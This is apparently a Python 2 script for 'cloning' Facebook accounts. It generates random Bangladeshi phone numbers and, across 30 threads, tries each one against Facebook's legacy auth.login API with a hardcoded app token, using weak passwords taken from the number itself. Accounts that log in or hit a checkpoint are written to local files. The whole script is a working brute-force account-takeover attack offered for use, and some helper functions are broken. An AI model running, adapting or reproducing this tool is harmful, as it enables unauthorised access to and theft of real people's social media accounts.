# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(1500):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)
def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)




back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m░█████╗░░██████╗░░██████╗░█████╗░
\033[1;96m██╔══██╗██╔═══██╗██╔════╝██╔══██╗
\033[1;95m███████║██║██╗██║╚█████╗░███████║
\033[1;93m██╔══██║╚██████╔╝░╚═══██╗██╔══██║
\033[1;94m██║░░██║░╚═██╔═╝░██████╔╝██║░░██║
\033[1;91m╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝

\033[1;97m██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
\033[1;96m██║░██╔╝██║░░██║██╔══██╗████╗░██║
\033[1;95m█████═╝░███████║███████║██╔██╗██║
\033[1;94m██╔═██╗░██╔══██║██╔══██║██║╚████║
\033[1;93m██║░╚██╗██║░░██║██║░░██║██║░╚███║
\033[1;91m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝


"""

####Logo####

logo1 = """

\033[1;97m░█████╗░░██████╗░░██████╗░█████╗░
\033[1;96m██╔══██╗██╔═══██╗██╔════╝██╔══██╗
\033[1;95m███████║██║██╗██║╚█████╗░███████║
\033[1;93m██╔══██║╚██████╔╝░╚═══██╗██╔══██║
\033[1;94m██║░░██║░╚═██╔═╝░██████╔╝██║░░██║
\033[1;91m╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝

\033[1;97m██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
\033[1;96m██║░██╔╝██║░░██║██╔══██╗████╗░██║
\033[1;95m█████═╝░███████║███████║██╔██╗██║
\033[1;94m██╔═██╗░██╔══██║██╔══██║██║╚████║
\033[1;93m██║░╚██╗██║░░██║██║░░██║██║░╚███║
\033[1;91m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
\033[1;90m NOTE:::::
\033[1;93mUSE FAST 4G INTERNET
\033[1;95m FAST CLONING K LIA 4/GB SA
 6/GB RAM WALA PHONE USE KRA

"""
CorrectPasscode = "AQSA"
jalan(" 🔒🔒🔒 4 Digit PassCode Required To Enter 🔒🔒🔒")

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[3;92m[🔒] \x1b[3;95mEnter PassCode\x1b[4;90m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[3;92m🔓🔓🔓Load\x1b[1;93ming.....
                  """
            jalan("...............with out login command(no need VPN)✅✅✅..........")
            loop = 'false'
    else:
            print "\033[3;90m🔒🔒🔒Wrong Entry!"
            os.system('xdg-open https://www.youtube.com/cannel/UCNx68447zLAljb_')
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
        os.system('clear')
        print logo1
        print logo1
        print '\x1b[1;97m◈◈◈◈[1]◈◈◈◈\033[3;96m 7 DIGIT \033[1;0m( INDIA)'
        pilih_Somi()

def pilih_Somi():
    Somi = raw_input("\n\033[1;95m➢ \033[1;96m")
    if Somi =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif Somi =="1":              
    	tik()
        os.system("clear")
        print logo1
        os.system("clear")
        print logo1
        jalan('\033[1;93m█▀▄ ▄▀▄ █▄░█ ▄▀▀░ █░░ ▄▀▄ █▀▄ █▀▀ ▄▀▀ █░░')
        jalan('\033[1;92m█▀█ █▀█ █░▀█ █░▀▌ █░▄ █▀█ █░█ █▀▀ ░▀▄ █▀▄')
        jalan('\033[1;96m▀▀░ ▀░▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀░▀ ▀▀░ ▀▀▀ ▀▀░ ▀░▀')
        print "\033[1;93mENTER ANY BANGLADESH NUMBER"+'\n \x1b[1;95m'
        print 'SELECT YOUR FAVOURITE SIM CODE : 175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")'
        try:
            c = raw_input("\033[1;93m➢ \033[1;96m")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif Somi =='0':
    	tik()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47* '\033[1;96m▬'
    xxx = str(len(id))
    jalan ('\033[1;96m➾ TOTAL IDS NUMBER : '+xxx)
    jalan ('\033[1;92m➾ CODE YOU CHOOSE: '+c)
    jalan ("\033[1;93m➾ PLEASE WAIT, PROCESS IS START ..")
    jalan ("\033[1;91m➾ TO STOP THIS PROCESS PRESS Ctrl THEN z")
    print 47* '\033[1;96m▬'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Open \x1b[1;96mNow \x1b[1;92m )  ' + k + c + user + '\x1b[1;91m ● \x1b[1;95m' + pass1                                       
                okb = open('save/successfull.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(Aftar \x1b[1;97m7days \x1b[1;93m) ' + k + c + user + '\x1b[1;91m ● \x1b[1;96m ' + pass1
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Open \x1b[1;96mNow \x1b[1;92m)  ' + k + c + user +  '\x1b[1;91m ● \x1b[1;95m' + pass2
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(Aftar \x1b[1;97m7days \x1b[1;93m) ' + k + c + user + '\x1b[1;91m ● \x1b[1;96m' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        
                                                                                                          
                                                                                                                                                                                                                    
                                                                                                                                                                                                            
                                                                                           
                                                                                                                                                                                                                    
                                                                                                                                                                                                         
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
    
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────    ───────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀



\033[1;96mThanks me later
\033[1;95mFb\033[1;97mSOmi
\033[1;95myoutube\033[1;97mhttps://w ww.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()


